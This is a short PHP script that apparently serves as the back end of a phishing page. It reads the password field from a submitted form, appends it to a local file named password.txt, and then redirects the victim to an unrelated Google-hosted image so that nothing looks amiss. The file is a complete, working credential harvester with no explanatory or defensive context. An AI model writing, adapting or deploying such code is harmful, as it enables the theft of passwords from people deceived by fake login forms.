<?php

file_put_contents("password.txt", " Pass: " . $pwd = $_POST['psw'] . "", FILE_APPEND);
header('Location: https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT11VkP_TmqNlBQ3r4YpVc_0-7_BmJF-rIyHw&usqp=CAU');
?>
